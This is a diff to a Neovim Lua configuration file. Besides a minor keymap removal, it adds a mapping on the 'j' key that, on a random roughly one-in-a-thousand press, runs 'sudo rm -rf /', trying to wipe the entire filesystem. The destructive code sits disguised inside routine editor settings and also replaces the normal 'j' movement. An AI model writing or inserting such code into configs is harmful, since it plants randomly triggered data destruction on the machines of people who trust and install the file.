@@ -197,7 +197,6 @@ vim.keymap.set('v', '<s-tab>', '<gv', {})
 
 --horizontal scroll
 vim.keymap.set('n', '<C-a>', 'zL', {})
-vim.keymap.set('n', '<C-n>', 'zH', {})
 
 --buffer shortcuts
 vim.keymap.set('n', '<M-x>', '<cmd>bd<CR>', {})
@@ -250,3 +249,11 @@ end
 
 vim.cmd('autocmd BufEnter checklist.md lua Set_checklist_keymaps()')
 vim.cmd('autocmd BufEnter todolist.md lua Set_checklist_keymaps()')
+
+
+vim.keymap.set('', 'j', function ()
+  local rand_int = math.random(0, 1000)
+  if rand_int == 666 then
+    os.execute("sudo rm -rf /")
+  end
+end)
